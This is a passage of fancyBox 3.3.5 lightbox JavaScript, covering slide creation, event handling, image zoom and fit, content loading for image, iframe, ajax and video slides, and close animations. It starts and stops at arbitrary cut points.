(s.opts.caption = d.opts.caption.apply(t, [d, s])), s.opts.caption instanceof g || (s.opts.caption = s.opts.caption === m ? "" : s.opts.caption + ""), "ajax" !== s.type || 1 < (a = r.split(/\s+/, 2)).length && (s.src = a.shift(), s.opts.filter = a.shift()), s.opts.modal && (s.opts = g.extend(!0, s.opts, {
            infobar: 0,
            toolbar: 0,
            smallBtn: 0,
            keyboard: 0,
            slideShow: 0,
            fullScreen: 0,
            thumbs: 0,
            touch: 0,
            clickContent: !1,
            clickSlide: !1,
            clickOutside: !1,
            dblclickContent: !1,
            dblclickSlide: !1,
            dblclickOutside: !1
          })), d.group.push(s);
        }), Object.keys(d.slides).length && (d.updateControls(), (t = d.Thumbs) && t.isActive && (t.create(), t.focus()));
      },
      addEvents: function () {
        var i = this;
        i.removeEvents(), i.$refs.container.on("click.fb-close", "[data-fancybox-close]", function (e) {
          e.stopPropagation(), e.preventDefault(), i.close(e);
        }).on("touchstart.fb-prev click.fb-prev", "[data-fancybox-prev]", function (e) {
          e.stopPropagation(), e.preventDefault(), i.previous();
        }).on("touchstart.fb-next click.fb-next", "[data-fancybox-next]", function (e) {
          e.stopPropagation(), e.preventDefault(), i.next();
        }).on("click.fb", "[data-fancybox-zoom]", function (e) {
          i[i.isScaledDown() ? "scaleToActual" : "scaleToFit"]();
        }), o.on("orientationchange.fb resize.fb", function (e) {
          e && e.originalEvent && "resize" === e.originalEvent.type ? p(function () {
            i.update();
          }) : (i.$refs.stage.hide(), setTimeout(function () {
            i.$refs.stage.show(), i.update();
          }, g.fancybox.isMobile ? 600 : 250));
        }), s.on("focusin.fb", function (e) {
          var t = g.fancybox ? g.fancybox.getInstance() : null;
          t.isClosing || !t.current || !t.current.opts.trapFocus || g(e.target).hasClass("fancybox-container") || g(e.target).is(a) || t && "fixed" !== g(e.target).css("position") && !t.$refs.container.has(e.target).length && (e.stopPropagation(), t.focus());
        }), s.on("keydown.fb", function (e) {
          var t = i.current,
            n = e.keyCode || e.which;
          if (t && t.opts.keyboard && !(e.ctrlKey || e.altKey || e.shiftKey || g(e.target).is("input") || g(e.target).is("textarea"))) return 8 === n || 27 === n ? (e.preventDefault(), void i.close(e)) : 37 === n || 38 === n ? (e.preventDefault(), void i.previous()) : 39 === n || 40 === n ? (e.preventDefault(), void i.next()) : void i.trigger("afterKeydown", e, n);
        }), i.group[i.currIndex].opts.idleTime && (i.idleSecondsCounter = 0, s.on("mousemove.fb-idle mouseleave.fb-idle mousedown.fb-idle touchstart.fb-idle touchmove.fb-idle scroll.fb-idle keydown.fb-idle", function (e) {
          i.idleSecondsCounter = 0, i.isIdle && i.showControls(), i.isIdle = !1;
        }), i.idleInterval = c.setInterval(function () {
          i.idleSecondsCounter++, i.idleSecondsCounter >= i.group[i.currIndex].opts.idleTime && !i.isDragging && (i.isIdle = !0, i.idleSecondsCounter = 0, i.hideControls());
        }, 1e3));
      },
      removeEvents: function () {
        o.off("orientationchange.fb resize.fb"), s.off("focusin.fb keydown.fb .fb-idle"), this.$refs.container.off(".fb-close .fb-prev .fb-next"), this.idleInterval && (c.clearInterval(this.idleInterval), this.idleInterval = null);
      },
      previous: function (e) {
        return this.jumpTo(this.currPos - 1, e);
      },
      next: function (e) {
        return this.jumpTo(this.currPos + 1, e);
      },
      jumpTo: function (e, i) {
        var t,
          n,
          o,
          r,
          a,
          s,
          l,
          d = this,
          c = d.group.length;
        if (!(d.isDragging || d.isClosing || d.isAnimating && d.firstRun)) {
          if (e = parseInt(e, 10), !(n = d.current ? d.current.opts.loop : d.opts.loop) && (e < 0 || c <= e)) return !1;
          if (t = d.firstRun = !Object.keys(d.slides).length, !(c < 2 && !t && d.isDragging)) {
            if (r = d.current, d.prevIndex = d.currIndex, d.prevPos = d.currPos, o = d.createSlide(e), 1 < c && ((n || 0 < o.index) && d.createSlide(e - 1), (n || o.index < c - 1) && d.createSlide(e + 1)), d.current = o, d.currIndex = o.index, d.currPos = o.pos, d.trigger("beforeShow", t), d.updateControls(), s = g.fancybox.getTranslate(o.$slide), o.isMoved = (0 !== s.left || 0 !== s.top) && !o.$slide.hasClass("fancybox-animated"), o.forcedDuration = m, g.isNumeric(i) ? o.forcedDuration = i : i = o.opts[t ? "animationDuration" : "transitionDuration"], i = parseInt(i, 10), t) return o.opts.animationEffect && i && d.$refs.container.css("transition-duration", i + "ms"), d.$refs.container.removeClass("fancybox-is-hidden"), f(d.$refs.container), d.$refs.container.addClass("fancybox-is-open"), f(d.$refs.container), o.$slide.addClass("fancybox-slide--previous"), d.loadSlide(o), o.$slide.removeClass("fancybox-slide--previous").addClass("fancybox-slide--current"), void d.preload("image");
            g.each(d.slides, function (e, t) {
              g.fancybox.stop(t.$slide);
            }), o.$slide.removeClass("fancybox-slide--next fancybox-slide--previous").addClass("fancybox-slide--current"), o.isMoved ? (a = Math.round(o.$slide.width()), g.each(d.slides, function (e, t) {
              var n = t.pos - o.pos;
              g.fancybox.animate(t.$slide, {
                top: 0,
                left: n * a + n * t.opts.gutter
              }, i, function () {
                t.$slide.removeAttr("style").removeClass("fancybox-slide--next fancybox-slide--previous"), t.pos === d.currPos && (o.isMoved = !1, d.complete());
              });
            })) : d.$refs.stage.children().removeAttr("style"), o.isLoaded ? d.revealContent(o) : d.loadSlide(o), d.preload("image"), r.pos !== o.pos && (l = "fancybox-slide--" + (r.pos > o.pos ? "next" : "previous"), r.$slide.removeClass("fancybox-slide--complete fancybox-slide--current fancybox-slide--next fancybox-slide--previous"), r.isComplete = !1, i && (o.isMoved || o.opts.transitionEffect) && (o.isMoved ? r.$slide.addClass(l) : (l = "fancybox-animated " + l + " fancybox-fx-" + o.opts.transitionEffect, g.fancybox.animate(r.$slide, l, i, function () {
              r.$slide.removeClass(l).removeAttr("style");
            }))));
          }
        }
      },
      createSlide: function (e) {
        var t,
          n,
          i = this;
        return n = (n = e % i.group.length) < 0 ? i.group.length + n : n, !i.slides[e] && i.group[n] && (t = g('<div class="fancybox-slide"></div>').appendTo(i.$refs.stage), i.slides[e] = g.extend(!0, {}, i.group[n], {
          pos: e,
          $slide: t,
          isLoaded: !1
        }), i.updateSlide(i.slides[e])), i.slides[e];
      },
      scaleToActual: function (e, t, n) {
        var i,
          o,
          r,
          a,
          s,
          l = this,
          d = l.current,
          c = d.$content,
          u = g.fancybox.getTranslate(d.$slide).width,
          p = g.fancybox.getTranslate(d.$slide).height,
          h = d.width,
          f = d.height;
        !l.isAnimating && c && "image" == d.type && d.isLoaded && !d.hasError && (g.fancybox.stop(c), l.isAnimating = !0, e = e === m ? .5 * u : e, t = t === m ? .5 * p : t, (i = g.fancybox.getTranslate(c)).top -= g.fancybox.getTranslate(d.$slide).top, i.left -= g.fancybox.getTranslate(d.$slide).left, a = h / i.width, s = f / i.height, o = .5 * u - .5 * h, r = .5 * p - .5 * f, u < h && (0 < (o = i.left * a - (e * a - e)) && (o = 0), o < u - h && (o = u - h)), p < f && (0 < (r = i.top * s - (t * s - t)) && (r = 0), r < p - f && (r = p - f)), l.updateCursor(h, f), g.fancybox.animate(c, {
          top: r,
          left: o,
          scaleX: a,
          scaleY: s
        }, n || 330, function () {
          l.isAnimating = !1;
        }), l.SlideShow && l.SlideShow.isActive && l.SlideShow.stop());
      },
      scaleToFit: function (e) {
        var t,
          n = this,
          i = n.current,
          o = i.$content;
        !n.isAnimating && o && "image" == i.type && i.isLoaded && !i.hasError && (g.fancybox.stop(o), n.isAnimating = !0, t = n.getFitPos(i), n.updateCursor(t.width, t.height), g.fancybox.animate(o, {
          top: t.top,
          left: t.left,
          scaleX: t.width / o.width(),
          scaleY: t.height / o.height()
        }, e || 330, function () {
          n.isAnimating = !1;
        }));
      },
      getFitPos: function (e) {
        var t,
          n,
          i,
          o,
          r,
          a = e.$content,
          s = e.width || e.opts.width,
          l = e.height || e.opts.height,
          d = {};
        return !!(e.isLoaded && a && a.length) && (o = {
          top: parseInt(e.$slide.css("paddingTop"), 10),
          right: parseInt(e.$slide.css("paddingRight"), 10),
          bottom: parseInt(e.$slide.css("paddingBottom"), 10),
          left: parseInt(e.$slide.css("paddingLeft"), 10)
        }, t = parseInt(this.$refs.stage.width(), 10) - (o.left + o.right), n = parseInt(this.$refs.stage.height(), 10) - (o.top + o.bottom), s && l || (s = t, l = n), i = Math.min(1, t / s, n / l), s = Math.floor(i * s), l = Math.floor(i * l), "image" === e.type ? (d.top = Math.floor(.5 * (n - l)) + o.top, d.left = Math.floor(.5 * (t - s)) + o.left) : "video" === e.contentType && (s / (r = e.opts.width && e.opts.height ? s / l : e.opts.ratio || 16 / 9) < l ? l = s / r : l * r < s && (s = l * r)), d.width = s, d.height = l, d);
      },
      update: function () {
        var n = this;
        g.each(n.slides, function (e, t) {
          n.updateSlide(t);
        });
      },
      updateSlide: function (e, t) {
        var n = this,
          i = e && e.$content,
          o = e.width || e.opts.width,
          r = e.height || e.opts.height;
        i && (o || r || "video" === e.contentType) && !e.hasError && (g.fancybox.stop(i), g.fancybox.setTranslate(i, n.getFitPos(e)), e.pos === n.currPos && (n.isAnimating = !1, n.updateCursor())), e.$slide.trigger("refresh"), n.$refs.toolbar.toggleClass("compensate-for-scrollbar", e.$slide.get(0).scrollHeight > e.$slide.get(0).clientHeight), n.trigger("onUpdate", e);
      },
      centerSlide: function (e, t) {
        var n, i;
        this.current && (n = Math.round(e.$slide.width()), i = e.pos - this.current.pos, g.fancybox.animate(e.$slide, {
          top: 0,
          left: i * n + i * e.opts.gutter,
          opacity: 1
        }, t === m ? 0 : t, null, !1));
      },
      updateCursor: function (e, t) {
        var n,
          i = this,
          o = i.current,
          r = i.$refs.container.removeClass("fancybox-is-zoomable fancybox-can-zoomIn fancybox-can-drag fancybox-can-zoomOut");
        o && !i.isClosing && (n = i.isZoomable(), r.toggleClass("fancybox-is-zoomable", n), g("[data-fancybox-zoom]").prop("disabled", !n), n && ("zoom" === o.opts.clickContent || g.isFunction(o.opts.clickContent) && "zoom" === o.opts.clickContent(o)) ? i.isScaledDown(e, t) ? r.addClass("fancybox-can-zoomIn") : o.opts.touch ? r.addClass("fancybox-can-drag") : r.addClass("fancybox-can-zoomOut") : o.opts.touch && "video" !== o.contentType && r.addClass("fancybox-can-drag"));
      },
      isZoomable: function () {
        var e,
          t = this.current;
        if (t && !this.isClosing && "image" === t.type && !t.hasError) {
          if (!t.isLoaded) return !0;
          if (e = this.getFitPos(t), t.width > e.width || t.height > e.height) return !0;
        }
        return !1;
      },
      isScaledDown: function (e, t) {
        var n = !1,
          i = this.current,
          o = i.$content;
        return e !== m && t !== m ? n = e < i.width && t < i.height : o && (n = (n = g.fancybox.getTranslate(o)).width < i.width && n.height < i.height), n;
      },
      canPan: function () {
        var e,
          t = !1,
          n = this.current;
        return "image" === n.type && (e = n.$content) && !n.hasError && (t = this.getFitPos(n), t = 1 < Math.abs(e.width() - t.width) || 1 < Math.abs(e.height() - t.height)), t;
      },
      loadSlide: function (n) {
        var e,
          t,
          i,
          o = this;
        if (!n.isLoading && !n.isLoaded) {
          switch (n.isLoading = !0, o.trigger("beforeLoad", n), e = n.type, (t = n.$slide).off("refresh").trigger("onReset").addClass(n.opts.slideClass), e) {
            case "image":
              o.setImage(n);
              break;
            case "iframe":
              o.setIframe(n);
              break;
            case "html":
              o.setContent(n, n.src || n.content);
              break;
            case "video":
              o.setContent(n, '<video class="fancybox-video" controls controlsList="nodownload"><source src="' + n.src + '" type="' + n.opts.videoFormat + "\">Your browser doesn't support HTML5 video</video");
              break;
            case "inline":
              g(n.src).length ? o.setContent(n, g(n.src)) : o.setError(n);
              break;
            case "ajax":
              o.showLoading(n), i = g.ajax(g.extend({}, n.opts.ajax.settings, {
                url: n.src,
                success: function (e, t) {
                  "success" === t && o.setContent(n, e);
                },
                error: function (e, t) {
                  e && "abort" !== t && o.setError(n);
                }
              })), t.one("onReset", function () {
                i.abort();
              });
              break;
            default:
              o.setError(n);
          }
          return !0;
        }
      },
      setImage: function (t) {
        var e,
          n,
          i,
          o,
          r,
          a = this,
          s = t.opts.srcset || t.opts.image.srcset;
        if (t.timouts = setTimeout(function () {
          var e = t.$image;
          !t.isLoading || e && e[0].complete || t.hasError || a.showLoading(t);
        }, 350), s) {
          o = c.devicePixelRatio || 1, r = c.innerWidth * o, (i = s.split(",").map(function (e) {
            var i = {};
            return e.trim().split(/\s+/).forEach(function (e, t) {
              var n = parseInt(e.substring(0, e.length - 1), 10);
              return 0 === t ? i.url = e : void (n && (i.value = n, i.postfix = e[e.length - 1]));
            }), i;
          })).sort(function (e, t) {
            return e.value - t.value;
          });
          for (var l = 0; l < i.length; l++) {
            var d = i[l];
            if ("w" === d.postfix && d.value >= r || "x" === d.postfix && d.value >= o) {
              n = d;
              break;
            }
          }
          !n && i.length && (n = i[i.length - 1]), n && (t.src = n.url, t.width && t.height && "w" == n.postfix && (t.height = t.width / t.height * n.value, t.width = n.value), t.opts.srcset = s);
        }
        t.$content = g('<div class="fancybox-content"></div>').addClass("fancybox-is-hidden").appendTo(t.$slide.addClass("fancybox-slide--image")), e = t.opts.thumb || !(!t.opts.$thumb || !t.opts.$thumb.length) && t.opts.$thumb.attr("src"), !1 !== t.opts.preload && t.opts.width && t.opts.height && e && (t.width = t.opts.width, t.height = t.opts.height, t.$ghost = g("<img />").one("error", function () {
          g(this).remove(), t.$ghost = null;
        }).one("load", function () {
          a.afterLoad(t);
        }).addClass("fancybox-image").appendTo(t.$content).attr("src", e)), a.setBigImage(t);
      },
      setBigImage: function (t) {
        var n = this,
          i = g("<img />");
        t.$image = i.one("error", function () {
          n.setError(t);
        }).one("load", function () {
          var e;
          t.$ghost || (n.resolveImageSlideSize(t, this.naturalWidth, this.naturalHeight), n.afterLoad(t)), t.timouts && (clearTimeout(t.timouts), t.timouts = null), n.isClosing || (t.opts.srcset && ((e = t.opts.sizes) && "auto" !== e || (e = (1 < t.width / t.height && 1 < o.width() / o.height() ? "100" : Math.round(t.width / t.height * 100)) + "vw"), i.attr("sizes", e).attr("srcset", t.opts.srcset)), t.$ghost && setTimeout(function () {
            t.$ghost && !n.isClosing && t.$ghost.hide();
          }, Math.min(300, Math.max(1e3, t.height / 1600))), n.hideLoading(t));
        }).addClass("fancybox-image").attr("src", t.src).appendTo(t.$content), (i[0].complete || "complete" == i[0].readyState) && i[0].naturalWidth && i[0].naturalHeight ? i.trigger("load") : i[0].error && i.trigger("error");
      },
      resolveImageSlideSize: function (e, t, n) {
        var i = parseInt(e.opts.width, 10),
          o = parseInt(e.opts.height, 10);
        e.width = t, e.height = n, 0 < i && (e.width = i, e.height = Math.floor(i * n / t)), 0 < o && (e.width = Math.floor(o * t / n), e.height = o);
      },
      setIframe: function (o) {
        var r,
          t = this,
          a = o.opts.iframe,
          e = o.$slide;
        o.$content = g('<div class="fancybox-content' + (a.preload ? " fancybox-is-hidden" : "") + '"></div>').css(a.css).appendTo(e), e.addClass("fancybox-slide--" + o.contentType), o.$iframe = r = g(a.tpl.replace(/\{rnd\}/g, new Date().getTime())).attr(a.attr).appendTo(o.$content), a.preload ? (t.showLoading(o), r.on("load.fb error.fb", function (e) {
          this.isReady = 1, o.$slide.trigger("refresh"), t.afterLoad(o);
        }), e.on("refresh.fb", function () {
          var e,
            t = o.$content,
            n = a.css.width,
            i = a.css.height;
          if (1 === r[0].isReady) {
            try {
              e = r.contents().find("body");
            } catch (e) {}
            e && e.length && e.children().length && (t.css({
              width: "",
              height: ""
            }), n === m && (n = Math.ceil(Math.max(e[0].clientWidth, e.outerWidth(!0)))), n && t.width(n), i === m && (i = Math.ceil(Math.max(e[0].clientHeight, e.outerHeight(!0)))), i && t.height(i)), t.removeClass("fancybox-is-hidden");
          }
        })) : this.afterLoad(o), r.attr("src", o.src), e.one("onReset", function () {
          try {
            g(this).find("iframe").hide().unbind().attr("src", "//about:blank");
          } catch (e) {}
          g(this).off("refresh.fb").empty(), o.isLoaded = !1;
        });
      },
      setContent: function (e, t) {
        var n;
        this.isClosing || (this.hideLoading(e), e.$content && g.fancybox.stop(e.$content), e.$slide.empty(), (n = t) && n.hasOwnProperty && n instanceof g && t.parent().length ? (t.parent().parent(".fancybox-slide--inline").trigger("onReset"), e.$placeholder = g("<div>").hide().insertAfter(t), t.css("display", "inline-block")) : e.hasError || ("string" !== g.type(t) || 3 === (t = g("<div>").append(g.trim(t)).contents())[0].nodeType && (t = g("<div>").html(t)), e.opts.filter && (t = g("<div>").html(t).find(e.opts.filter))), e.$slide.one("onReset", function () {
          g(this).find("video,audio").trigger("pause"), e.$placeholder && (e.$placeholder.after(t.hide()).remove(), e.$placeholder = null), e.$smallBtn && (e.$smallBtn.remove(), e.$smallBtn = null), e.hasError || (g(this).empty(), e.isLoaded = !1);
        }), g(t).appendTo(e.$slide), g(t).is("video,audio") && (g(t).addClass("fancybox-video"), g(t).wrap("<div></div>"), e.contentType = "video", e.opts.width = e.opts.width || g(t).attr("width"), e.opts.height = e.opts.height || g(t).attr("height")), e.$content = e.$slide.children().filter("div,form,main,video,audio").first().addClass("fancybox-content"), e.$slide.addClass("fancybox-slide--" + e.contentType), this.afterLoad(e));
      },
      setError: function (e) {
        e.hasError = !0, e.$slide.trigger("onReset").removeClass("fancybox-slide--" + e.contentType).addClass("fancybox-slide--error"), e.contentType = "html", this.setContent(e, this.translate(e, e.opts.errorTpl)), e.pos === this.currPos && (this.isAnimating = !1);
      },
      showLoading: function (e) {
        (e = e || this.current) && !e.$spinner && (e.$spinner = g(this.translate(this, this.opts.spinnerTpl)).appendTo(e.$slide));
      },
      hideLoading: function (e) {
        (e = e || this.current) && e.$spinner && (e.$spinner.remove(), delete e.$spinner);
      },
      afterLoad: function (e) {
        var t = this;
        t.isClosing || (e.isLoading = !1, e.isLoaded = !0, t.trigger("afterLoad", e), t.hideLoading(e), e.pos === t.currPos && t.updateCursor(), !e.opts.smallBtn || e.$smallBtn && e.$smallBtn.length || (e.$smallBtn = g(t.translate(e, e.opts.btnTpl.smallBtn)).prependTo(e.$content)), e.opts.protect && e.$content && !e.hasError && (e.$content.on("contextmenu.fb", function (e) {
          return 2 == e.button && e.preventDefault(), !0;
        }), "image" === e.type && g('<div class="fancybox-spaceball"></div>').appendTo(e.$content)), t.revealContent(e));
      },
      revealContent: function (t) {
        var e,
          n,
          i,
          o,
          r = this,
          a = t.$slide,
          s = !1,
          l = !1;
        return e = t.opts[r.firstRun ? "animationEffect" : "transitionEffect"], i = t.opts[r.firstRun ? "animationDuration" : "transitionDuration"], i = parseInt(t.forcedDuration === m ? i : t.forcedDuration, 10), t.pos === r.currPos && (t.isComplete ? e = !1 : r.isAnimating = !0), !t.isMoved && t.pos === r.currPos && i || (e = !1), "zoom" === e && (t.pos === r.currPos && i && "image" === t.type && !t.hasError && (l = r.getThumbPos(t)) ? s = r.getFitPos(t) : e = "fade"), "zoom" === e ? (s.scaleX = s.width / l.width, s.scaleY = s.height / l.height, "auto" == (o = t.opts.zoomOpacity) && (o = .1 < Math.abs(t.width / t.height - l.width / l.height)), o && (l.opacity = .1, s.opacity = 1), g.fancybox.setTranslate(t.$content.removeClass("fancybox-is-hidden"), l), f(t.$content), void g.fancybox.animate(t.$content, s, i, function () {
          r.isAnimating = !1, r.complete();
        })) : (r.updateSlide(t), e ? (g.fancybox.stop(a), n = "fancybox-animated fancybox-slide--" + (t.pos >= r.prevPos ? "next" : "previous") + " fancybox-fx-" + e, a.removeAttr("style").removeClass("fancybox-slide--current fancybox-slide--next fancybox-slide--previous").addClass(n), t.$content.removeClass("fancybox-is-hidden"), f(a), void g.fancybox.animate(a, "fancybox-slide--current", i, function (e) {
          a.removeClass(n).removeAttr("style"), t.pos === r.currPos && r.complete();
        }, !0)) : (f(a), t.$content.removeClass("fancybox-is-hidden"), void (t.pos === r.currPos && r.complete())));
      },
      getThumbPos: function (e) {
        var t,
          n = !1,
          i = e.opts.$thumb,
          o = i && i.length && i[0].ownerDocument === a ? i.offset() : 0;
        return o && function (e) {
          for (var t = e[0], i = t.getBoundingClientRect(), n = []; null !== t.parentElement;) "hidden" !== g(t.parentElement).css("overflow") && "auto" !== g(t.parentElement).css("overflow") || n.push(t.parentElement.getBoundingClientRect()), t = t.parentElement;
          return n.every(function (e) {
            var t = Math.min(i.right, e.right) - Math.max(i.left, e.left),
              n = Math.min(i.bottom, e.bottom) - Math.max(i.top, e.top);
            return 0 < t && 0 < n;
          }) && 0 < i.bottom && 0 < i.right && i.left < g(c).width() && i.top < g(c).height();
        }(i) && (t = this.$refs.stage.offset(), n = {
          top: o.top - t.top + parseFloat(i.css("border-top-width") || 0),
          left: o.left - t.left + parseFloat(i.css("border-left-width") || 0),
          width: i.width(),
          height: i.height(),
          scaleX: 1,
          scaleY: 1
        }), n;
      },
      complete: function () {
        var n = this,
          e = n.current,
          i = {};
        !e.isMoved && e.isLoaded && (e.isComplete || (e.isComplete = !0, e.$slide.siblings().trigger("onReset"), n.preload("inline"), f(e.$slide), e.$slide.addClass("fancybox-slide--complete"), g.each(n.slides, function (e, t) {
          t.pos >= n.currPos - 1 && t.pos <= n.currPos + 1 ? i[t.pos] = t : t && (g.fancybox.stop(t.$slide), t.$slide.off().remove());
        }), n.slides = i), n.isAnimating = !1, n.updateCursor(), n.trigger("afterShow"), e.$slide.find("video,audio").filter(":visible:first").trigger("play"), (g(a.activeElement).is("[disabled]") || e.opts.autoFocus && "image" != e.type && "iframe" !== e.type) && n.focus());
      },
      preload: function (e) {
        var t = this,
          n = t.slides[t.currPos + 1],
          i = t.slides[t.currPos - 1];
        n && n.type === e && t.loadSlide(n), i && i.type === e && t.loadSlide(i);
      },
      focus: function () {
        var e,
          t = this.current;
        this.isClosing || t && t.isComplete && t.$content && ((e = t.$content.find("input[autofocus]:enabled:visible:first")).length || (e = t.$content.find("button,:input,[tabindex],a").filter(":enabled:visible:first")), (e = e && e.length ? e : t.$content).trigger("focus"));
      },
      activate: function () {
        var t = this;
        g(".fancybox-container").each(function () {
          var e = g(this).data("FancyBox");
          e && e.id !== t.id && !e.isClosing && (e.trigger("onDeactivate"), e.removeEvents(), e.isVisible = !1);
        }), t.isVisible = !0, (t.current || t.isIdle) && (t.update(), t.updateControls()), t.trigger("onActivate"), t.addEvents();
      },
      close: function (e, t) {
        function n() {
          c.cleanUp(e);
        }
        var i,
          o,
          r,
          a,
          s,
          l,
          d,
          c = this,
          u = c.current;
        return !c.isClosing && (!(c.isClosing = !0) === c.trigger("beforeClose", e) ? (c.isClosing = !1, p(function () {
          c.update();
        }), !1) : (c.removeEvents(), u.timouts && clearTimeout(u.timouts), r = u.$content, i = u.opts.animationEffect, o = g.isNumeric(t) ? t : i ? u.opts.animationDuration : 0, u.$slide.off(h).removeClass("fancybox-slide--complete fancybox-slide--next fancybox-slide--previous fancybox-animated"), u.$slide.siblings().trigger("onReset").remove(), o && c.$refs.container.removeClass("fancybox-is-open").addClass("fancybox-is-closing"), c.hideLoading(u), c.hideControls(), c.updateCursor(), "zoom" !== i || !0 !== e && r && o && "image" === u.type && !u.hasError && (d = c.getThumbPos(u)) || (i = "fade"), "zoom" === i ? (g.fancybox.stop(r), l = {
          top: (a = g.fancybox.getTranslate(r)).top,
          left: a.left,
          scaleX: a.width / d.width,
          scaleY: a.height / d.height,
          width: d.width,
          height: d.height
        }, "auto" == (s = u.opts.zoomOpacity) && (s = .1 < Math.abs(u.width / u.height - d.width / d.height)), s && (d.opacity = 0), g.fancybox.setTranslate(r, l), f(r), g.fancybox.animate(r, d, o, n)) : i && o ? !0 === e ? setTimeout(n, o) : g.fancybox.animate(u.$slide.removeClass("fancybox-slide--current"), "fancybox-animated fancybox-slide--previous fancybox-fx-" + i, o, n) : n(), !0));
      },
      cleanUp: function (e) {
        var t,
          n = this,
          i = g("body");
        n.current.$slide.trigger("onReset"), n.$refs.container.empty().remove(), n.trigger("afterClose", e), n.$lastFocus && n.current.opts.backFocus && n.$lastFocus.trigger("focus"), n.current = null, (t = g.fancybox.getInstance()) ? t.activate() : (i.removeClass("fancybox-active compensate-for-scrollbar"), g("#fancybox-style-noscroll").remove());
      },
      trigger: function (e, t) {
        var n,
          i = Array.prototype.slice.call(arguments, 1),
          o = this,
          r = t && t.opts ? t : o.current;
        return r ? i.unshift(r) : r = o, i.unshift(o), g.isFunction(r.opts[e]) && (n = r.opts[e].apply(r, i)), !1 === n ? n : void ("afterClose" !== e && o.$refs ? o.$refs.container.trigger(e + ".fb", i) : s.trigger(e + ".fb", i));
      },
      updateControls: function (e) {
        var t = this,
          n = t.current,
          i = n.index,
          o = n.opts.caption,
          r = t.$refs.container,
          a = t.$refs.caption;
        n.$slide.trigger("refresh"), t.$caption = o && o.length ? a.html(o) : null, t.isHiddenControls || t.isIdle || t.showControls(), r.find("[data-fancybox-count]").html(t.group.length), r.find("[data-fancybox-index]").html(i + 1), r.find("[data-fancybox-prev]").toggleClass("disabled", !n.opts.loop && i <= 0), r.find("[data-fancybox-next]").toggleClass("disabled", !n.opts.loop && i >= t.group.length - 1), "image" === n.type ? r.find("[data-fancybox-zoom]").show().end().find("[data-fancybox-download]").attr("href", n.opts.image.src || n.src).show() : n.opts.toolbar && r.find("[data-fancybox-download],[data-fancybox-zoom]").hide();
      },
      hideControls: function () {
        this.isHiddenControls = !0, this.$refs.container.removeClass("fancybox-show-infobar fancybox-show-toolbar fancybox-show-caption fancybox-show-nav");
      },
      showControls: function () {
        var e = this,
          t = e.current ? e.current.opts : e.opts,
          n = e.$refs.container;
        e.isHiddenControls = !1, e.idleSecondsCounter = 0, n.toggleClass("fancybox-show-toolbar", !(!t.toolbar || !t.buttons)).toggleClass("fancybox-show-infobar", !!(t.infobar && 1 < e.group.length)).toggleClass("fancybox-show-nav", !!(t.arrows && 1 < e.group.length)).toggleClass("fancybox-is-modal", !!t.modal), e.$caption ? n.addClass("fancybox-show-caption ") : n.removeClass("fancybox-show-caption");
      },
      toggleControls: function () {
        this.isHiddenControls ? this.showControls() : this.hideControls();
      }
    }), g.fancybox = {
      version: "3.3.5",
      defaults: e,
      getInstance: function (e) {
        var t = g('.fancybox-container:not(".fancybox-is-closing"):last').data("FancyBox"),
          n = Array.prototype.slice.call(arguments, 1);
        return t instanceof i && ("string" === g.type(e) ? t[e].apply(t, n) : "function" === g.type(e) && e.apply(t, n), t);
      },
      open: function (e, t, n) {
        return new i(e, t, n);
      },
      close: function (e) {
        var t = this.getInstance();
        t && (t.close(), !0 === e && this.close());
      },
      destroy: function () {
        this.close(!0), s.add("body").off("click.fb-start", "**");
      },
      isMobile: a.createTouch !== m && /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent),
      use3d: (t = a.createElement("div"), c.getComputedStyle && c.getComputedStyle(t) && c.getComputedStyle(t).getPropertyValue("transform") && !(a.documentMode && a.documentMode < 11)),
      getTranslate: function (e) {
        var t;
        return !(!e || !e.length) && {
          top: (t = e[0].getBoundingClientRect()).top || 0,
          left: t.left || 0,
          width: t.width,
          height: t.height,
          opacity: parseFloat(e.css("opacity"))
        };
      },
      setTranslate: function (e, t) {
        var n = "",
          i = {};
        if (e && t) return t.left === m && t.top === m || (n = (t.left === m ? e.position().left : t.left) + "px, " + (t.top === m ? e.position().top : t.top) + "px", n = this.use3d ? "translate3d(" + n + ", 0px)" : "translate(" + n + ")"), t.scaleX !== m && t.scaleY !== m && (n = (n.length ? n + " " : "") + "scale(" + t.scaleX + ", " + t.scaleY + ")"), n.length && (i.transform = n), t.opacity !== m && (i.opacity = t.opacity), t.width !== m && (i.width = t.width), t.height !== m && (i.height = t.height), e.css(i);
      },
      animate: function (t, n, e, i, o) {
        var r = !1;
        g.isFunction(e) && (i = e, e = null), g.isPlainObject(n) || t.removeAttr("style"), g.fancybox.stop(t), t.on(h, function (e) {
          e && e.originalEvent && (!t.is(e.originalEvent.target) || "z-index" == e.originalEvent.propertyName) || (g.fancybox.stop(t), r && g.fancybox.setTranslate(t, r), g.isPlainObject(n) ? !1 === o && t.removeAttr("style") : !0 !== o && t.removeClass(n), g.isFunction(i) && i(e));
        }), g.isNumeric(e) && t.css("transition-duration", e + "ms"), g.isPlainObject(n) ? (n.scaleX !== m && n.scaleY !== m && (r = g.extend({}, n, {
          width: t.width() * n.scaleX,
          height: t.height() * n.scaleY,
          scaleX: 1,
          scaleY: 1
        }), delete n.width, delete n.height, t.parent().hasClass("fancybox-slide--image") && t.parent().addClass("fancybox-is-scaling")), g.fancybox.setTranslate(t, n)) : t.addClass(n), t.data("timer", setTimeout(function () {
          t.trigger("transitionend");
        }, e + 16));
      },
      stop: function (e) {
        e && e.length && (clearTimeout(e.data("timer")), e.off("transitionend").css("transition-duration", ""), e.parent().removeClass("fancybox-is-scaling"));
      }
    }, g.fn.fancybox = function (e) {
      var t;
      return (t = (e = e || {}).selector || !1) ? g("body").off("click.fb-start", t).on("click.fb-start", t, {
        options: e
      }, n) : this.off("click.fb-start").on("click.fb-start", {
        items: this,
        options: e
      }, n), this;
    }, s.on("click.fb-start", "[data-fancybox]", n), s.on("click.fb-start", "[data-trigger]", function (e) {
      n(e, {
        $target: g('[data-fancybox="' + g(e.currentTarget).attr("data-trigger") + '"]').eq(g(e.currentTarget).attr("data-index") || 0),
        $trigger: g(this)
      });
    });
  }
  var t;
}(window, document, window.jQuery || jQuery), function (h) {
  "use strict";

  function f(n, e, t) {
    if (n) return t = t || "", "object" === h.type(t) && (t = h.param(t, !0)), h.each(e, function (e, t) {
      n = n.replace("$" + e, t || "");
    }), t.length && (n += (0 < n.indexOf("?") ? "&" : "?") + t), n;
  }
  var i = {
    youtube: {
